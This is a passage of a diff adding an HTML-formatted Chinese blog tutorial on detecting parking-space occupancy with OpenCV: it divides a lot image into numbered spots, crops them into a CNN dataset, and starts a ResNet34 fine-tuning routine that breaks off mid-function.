+            rects<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">10</span>
+        <span class="token keyword">elif</span> k <span class="token operator">==</span> <span class="token number">2</span> <span class="token keyword">or</span> k <span class="token operator">==</span> <span class="token number">3</span> <span class="token keyword">or</span> k <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">:</span>
+            rects<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">4</span>
+            rects<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">13</span>
+        <span class="token keyword">elif</span> k <span class="token operator">==</span> <span class="token number">6</span> <span class="token keyword">or</span> k <span class="token operator">==</span> <span class="token number">8</span><span class="token punctuation">:</span>
+            rects<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-=</span> <span class="token number">18</span>
+            rects<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">12</span>
+        <span class="token keyword">elif</span> k <span class="token operator">==</span> <span class="token number">9</span><span class="token punctuation">:</span>
+            rects<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">10</span>
+            rects<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">10</span>
+        <span class="token keyword">elif</span> k <span class="token operator">==</span> <span class="token number">10</span><span class="token punctuation">:</span>
+            rects<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">45</span>
+        <span class="token keyword">elif</span> k <span class="token operator">==</span> <span class="token number">11</span><span class="token punctuation">:</span>
+            rects<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+=</span> <span class="token number">45</span>
+    
+    buff <span class="token operator">=</span> <span class="token number">8</span>
+    <span class="token keyword">for</span> key <span class="token keyword">in</span> rects<span class="token punctuation">:</span>
+        tup_topLeft <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>rects<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span>buff<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rects<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        tup_botRight <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>rects<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span>buff<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>rects<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+        cv2<span class="token punctuation">.</span>rectangle<span class="token punctuation">(</span>image_copy<span class="token punctuation">,</span> tup_topLeft<span class="token punctuation">,</span> tup_botRight<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span>
+    
+    <span class="token keyword">return</span> image_copy<span class="token punctuation">,</span> rects
+</code></pre> 
+<p>微调之后的效果如下：</p> 
+<p><img src="https://images2.imgbox.com/8d/af/p4pSEgeX_o.png" alt="在这里插入图片描述"><br> 原则就是不遗漏，不多余。</p> 
+<h3>
+<a id="36__268"></a>3.6 锁定每个停车位</h3> 
+<p>这里就是针对每个矩形框， 对里面的停车位用直线切割成一个个的，每个停车位用(x1,y1,x2,y2)标识，左上角和右下角的坐标。并进行标号，最终形成一个字典，字典的键就是位置，值就是序号。当然，这里的一个细节，依然是中间排是两排，首尾是一排，这个在具体划分停车位的时候，一定要注意。</p> 
+<pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">draw_parking</span><span class="token punctuation">(</span>image<span class="token punctuation">,</span> rects<span class="token punctuation">,</span> make_copy<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> save<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    gap <span class="token operator">=</span> <span class="token number">15.5</span>
+    spot_dict <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>  <span class="token comment"># 一个车位对应一个位置</span>
+    tot_spots <span class="token operator">=</span> <span class="token number">0</span>
+    
+    <span class="token comment">#微调</span>
+    adj_x1 <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">}</span>
+    adj_x2 <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">:</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">:</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">:</span><span class="token number">0</span><span class="token punctuation">}</span>
+    fine_tune_y <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">:</span> <span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">:</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">}</span>
+    
+    <span class="token keyword">for</span> key <span class="token keyword">in</span> rects<span class="token punctuation">:</span>
+        tup <span class="token operator">=</span> rects<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
+        x1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>tup<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> adj_x1<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        x2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>tup<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> adj_x2<span class="token punctuation">[</span>key<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        y1 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>tup<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        y2 <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>tup<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        cv2<span class="token punctuation">.</span>rectangle<span class="token punctuation">(</span>new_image<span class="token punctuation">,</span> <span class="token punctuation">(</span>x1<span class="token punctuation">,</span> y1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span>x2<span class="token punctuation">,</span>y2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>
+        
+        num_splits <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token builtin">abs</span><span class="token punctuation">(</span>y2<span class="token operator">-</span>y1<span class="token punctuation">)</span><span class="token operator">//</span>gap<span class="token punctuation">)</span>
+        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> num_splits<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+            y <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>y1<span class="token operator">+</span>i<span class="token operator">*</span>gap<span class="token punctuation">)</span> <span class="token operator">+</span> fine_tune_y<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
+            cv2<span class="token punctuation">.</span>line<span class="token punctuation">(</span>new_image<span class="token punctuation">,</span> <span class="token punctuation">(</span>x1<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>x2<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> key <span class="token operator">&gt;</span> <span class="token number">0</span> <span class="token keyword">and</span> key <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>rects<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>
+            <span class="token comment"># 竖直线</span>
+            x <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x1<span class="token operator">+</span>x2<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>
+            cv2<span class="token punctuation">.</span>line<span class="token punctuation">(</span>new_image<span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> y2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
+        
+        <span class="token comment"># 计算数量   除了第一列和最后一列，中间的都是两列的</span>
+        <span class="token keyword">if</span> key <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">or</span> key <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>rects<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>
+            tot_spots <span class="token operator">+=</span> num_splits <span class="token operator">+</span> <span class="token number">1</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            tot_spots <span class="token operator">+=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span>num_splits <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>
+        
+        <span class="token comment"># 字典对应好</span>
+        <span class="token keyword">if</span> key <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">or</span> key <span class="token operator">==</span> <span class="token builtin">len</span><span class="token punctuation">(</span>rects<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>
+            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> num_splits<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                cur_len <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>spot_dict<span class="token punctuation">)</span>
+                y <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>y1 <span class="token operator">+</span> i <span class="token operator">*</span> gap<span class="token punctuation">)</span> <span class="token operator">+</span> fine_tune_y<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
+                spot_dict<span class="token punctuation">[</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> y<span class="token operator">+</span>gap<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> cur_len <span class="token operator">+</span> <span class="token number">1</span>
+        <span class="token keyword">else</span><span class="token punctuation">:</span>
+            <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> num_splits<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+                cur_len <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>spot_dict<span class="token punctuation">)</span>
+                y <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>y1 <span class="token operator">+</span> i <span class="token operator">*</span> gap<span class="token punctuation">)</span> <span class="token operator">+</span> fine_tune_y<span class="token punctuation">[</span>key<span class="token punctuation">]</span>
+                x <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token punctuation">(</span>x1<span class="token operator">+</span>x2<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span>
+                spot_dict<span class="token punctuation">[</span><span class="token punctuation">(</span>x1<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token operator">+</span>gap<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> cur_len <span class="token operator">+</span> <span class="token number">1</span>
+                spot_dict<span class="token punctuation">[</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> y<span class="token operator">+</span>gap<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> cur_len <span class="token operator">+</span> <span class="token number">2</span>
+  
+    <span class="token keyword">return</span> new_image<span class="token punctuation">,</span> spot_dict
+</code></pre> 
+<p>这里的fine_tune_y也是我后来加上去的，也是为了让每一列尽量把车位划分的准确些。</p> 
+<p><img src="https://images2.imgbox.com/5a/0a/NAeast3N_o.png" alt="在这里插入图片描述"><br> 从这个效果上来看，基本上就把车位一个个的划分开了，划分开之后，会发现，这里面有些并不是车位， 但依然给框住了。这样统计个数的时候，以及后面给信息停车的时候会受到影响，所以我这里又一一排查，去掉了这些无效的车位。</p> 
+<pre><code class="prism language-python"><span class="token comment"># 去掉多余的停车位</span>
+invalid_spots <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">,</span> <span class="token number">34</span><span class="token punctuation">,</span> <span class="token number">37</span><span class="token punctuation">,</span> <span class="token number">38</span><span class="token punctuation">,</span> <span class="token number">61</span><span class="token punctuation">,</span> <span class="token number">62</span><span class="token punctuation">,</span> <span class="token number">93</span><span class="token punctuation">,</span> <span class="token number">94</span><span class="token punctuation">,</span> <span class="token number">95</span><span class="token punctuation">,</span> <span class="token number">97</span><span class="token punctuation">,</span> <span class="token number">98</span><span class="token punctuation">,</span> <span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">137</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">187</span><span class="token punctuation">,</span> <span class="token number">249</span><span class="token punctuation">,</span> 
+           <span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">253</span><span class="token punctuation">,</span> <span class="token number">254</span><span class="token punctuation">,</span> <span class="token number">323</span><span class="token punctuation">,</span> <span class="token number">324</span><span class="token punctuation">,</span> <span class="token number">327</span><span class="token punctuation">,</span> <span class="token number">328</span><span class="token punctuation">,</span> <span class="token number">467</span><span class="token punctuation">,</span> <span class="token number">468</span><span class="token punctuation">,</span> <span class="token number">531</span><span class="token punctuation">,</span> <span class="token number">532</span><span class="token punctuation">]</span>
+valid_spots_dict <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span>
+cur_idx <span class="token operator">=</span> <span class="token number">1</span>
+<span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> spot_dict<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> v <span class="token keyword">in</span> invalid_spots<span class="token punctuation">:</span>
+        <span class="token keyword">continue</span>
+    valid_spots_dict<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> cur_idx
+    cur_idx <span class="token operator">+=</span> <span class="token number">1</span>
+</code></pre> 
+<p>这样，还可以把处理好的车位信息进行可视化，再进行微调，不过，我这里由于之前的一些微调操作，感觉效果还可以，就没有做任何调整啦。</p> 
+<pre><code class="prism language-python"><span class="token comment"># 把每一个有效停车位标记出来</span>
+tmp_img <span class="token operator">=</span> test_image<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> valid_spots_dict<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    cv2<span class="token punctuation">.</span>rectangle<span class="token punctuation">(</span>tmp_img<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token builtin">int</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">255</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
+cv_imshow<span class="token punctuation">(</span><span class="token string">'valid_pot'</span><span class="token punctuation">,</span> tmp_img<span class="token punctuation">)</span>
+</code></pre> 
+<p>效果如下：<br> <img src="https://images2.imgbox.com/e5/83/0PaJe8aT_o.png" alt="在这里插入图片描述"><br> 如果要想让后面模型对于每个车位预测的更加准确，这里的划分一定要尽量的细致和标准。 否则如果矩形框和真实的车位对应不上，比如矩形框卡在了两个车位中间这种，这样划分出的车位拿给模型看，就很容易判断出错。</p> 
+<p>另外，最终的这个字典很重要，因为这个字典里面保存的是各个车位的位置信息。 有了这个东西，拿到一帧图片，就可以直接把每个车位标定出来，拿给模型预测。 并且对于同一停车场，这个每个车位是固定的。所以这个也不会变，视频的所有图像共用。 这样能保证实时性。</p> 
+<h3>
+<a id="37_CNN_353"></a>3.7 为CNN生成预测图片</h3> 
+<p>有了各个车位的具体位置信息，下面直接按照这里面的左边把每个车位切割出来，就能得到后面CNN的训练和验证的数据集了。</p> 
+<pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">save_images_for_cnn</span><span class="token punctuation">(</span>image<span class="token punctuation">,</span> spot_dict<span class="token punctuation">,</span> folder_name <span class="token operator">=</span> <span class="token string">'../cnn_pred_data'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> spot <span class="token keyword">in</span> spot_dict<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token punctuation">(</span>x1<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> y2<span class="token punctuation">)</span> <span class="token operator">=</span> spot
+        <span class="token punctuation">(</span>x1<span class="token punctuation">,</span> y1<span class="token punctuation">,</span> x2<span class="token punctuation">,</span> y2<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>y1<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>x2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>y2<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        
+        <span class="token comment"># 裁剪</span>
+        spot_img <span class="token operator">=</span> image<span class="token punctuation">[</span>y1<span class="token punctuation">:</span>y2<span class="token punctuation">,</span> x1<span class="token punctuation">:</span>x2<span class="token punctuation">]</span>
+        spot_img <span class="token operator">=</span> cv2<span class="token punctuation">.</span>resize<span class="token punctuation">(</span>spot_img<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> fx<span class="token operator">=</span><span class="token number">2.0</span><span class="token punctuation">,</span> fy<span class="token operator">=</span><span class="token number">2.0</span><span class="token punctuation">)</span>
+        spot_id <span class="token operator">=</span> spot_dict<span class="token punctuation">[</span>spot<span class="token punctuation">]</span>
+        
+        filename <span class="token operator">=</span> <span class="token string">'spot_{}.jpg'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>spot_id<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        
+        <span class="token comment"># print(spot_img.shape, filename, (x1,x2,y1,y2))</span>
+        cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span>os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>folder_name<span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">,</span> spot_img<span class="token punctuation">)</span>
+  
+save_images_for_cnn<span class="token punctuation">(</span>test_image<span class="token punctuation">,</span> valid_spots_dict<span class="token punctuation">)</span>
+</code></pre> 
+<p>这样，就把模型的训练数据集准备好。 在文件中组织成这个样子：</p> 
+<p><img src="https://images2.imgbox.com/52/03/HUArq5Dy_o.png" alt="在这里插入图片描述"><br> 每个目录里面，就是划分出来的一张张小的车位图像，不过这里是人为划分到了有车还是无车里面。所以后面的模型其实做一个二分类任务，给定这样一张车位的小图像，预测下是不是空的即可。</p> 
+<p>下面开始说模型的细节。</p> 
+<h2>
+<a id="4__381"></a>4. 模型的训练和预测</h2> 
+<p>由于目前的样本非常少，不足以训练一个大模型到收敛，所以这里采用的迁移学习技术，用的预训练模型。</p> 
+<p>模型这里和视频中不一样的是，我统一采用pytorch写的模型训练和测试代码，原因是最近正在尝试pytorch复现cv里面的各个经典网络，这个项目正好让我拿来练手。另外一个就是感觉keras搭建的灵活度不够，在数据预处理方面不如torchvision里面transforms用起来方便。 基于这两个原因， 我这里直接用pytorch，采用的resnet34预训练模型，使用这个的原因是这两天正好把resnet复现了一遍，稍微熟悉了一点罢了，正好能学以致用，没有啥偏爱。</p> 
+<p>由于这里的代码非常多，这里就不过多罗列了，简单说下逻辑即可，感兴趣的可以看具体项目。</p> 
+<p>首先是训练模型。</p> 
+<h3>
+<a id="41__389"></a>4.1 模型训练</h3> 
+<p>这个整体逻辑倒是可以看下：</p> 
+<pre><code class="prism language-python"><span class="token keyword">def</span> <span class="token function">train_model</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token comment"># 获取dataloader</span>
+    data_root <span class="token operator">=</span> os<span class="token punctuation">.</span>getcwd<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    image_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>data_root<span class="token punctuation">,</span> <span class="token string">"train_data"</span><span class="token punctuation">)</span>
+    train_data_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>image_path<span class="token punctuation">,</span> <span class="token string">"train"</span><span class="token punctuation">)</span>
+    val_data_path <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>join<span class="token punctuation">(</span>image_path<span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span>
+    train_loader<span class="token punctuation">,</span> validat_loader<span class="token punctuation">,</span> train_num<span class="token punctuation">,</span> val_num <span class="token operator">=</span> get_dataloader<span class="token punctuation">(</span>train_data_path<span class="token punctuation">,</span> val_data_path<span class="token punctuation">,</span>
+                                                                      data_transform_pretrain<span class="token punctuation">,</span> batch_size<span class="token operator">=</span><span class="token number">8</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># 创建模型 注意这里没指定类的个数，默认是1000类</span>
+    net <span class="token operator">=</span> resnet34<span class="token punctuation">(</span><span class="token punctuation">)</span>
+    model_weight_path <span class="token operator">=</span> <span class="token string">'saved_model_weight/resnet34_pretrain_ori_low_torch_version.pth'</span>
+
+    <span class="token comment"># 使用预训练的参数，然后进行finetune</span>
+    net<span class="token punctuation">.</span>load_state_dict<span class="token punctuation">(</span>torch<span class="token punctuation">.</span>load<span class="token punctuation">(</span>model_weight_path<span class="token punctuation">,</span> map_location<span class="token operator">=</span><span class="token string">'cpu'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+    <span class="token comment"># 改变fc layer structure  把fc的输出维度改为2</span>
+    in_channel <span class="token operator">=</span> net<span class="token punctuation">.</span>fc<span class="token punctuation">.</span>in_features
+    net<span class="token punctuation">.</span>fc <span class="token operator">=</span> nn<span class="token punctuation">.</span>Linear<span class="token punctuation">(</span>in_channel<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
+    net<span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>
+
+    <span class="token comment"># 模型训练配置</span>
+    loss_function <span class="token operator">=</span> nn<span class="token punctuation">.</span>CrossEntropyLoss<span class="token punctuation">(</span><span class="token punctuation">)</span>
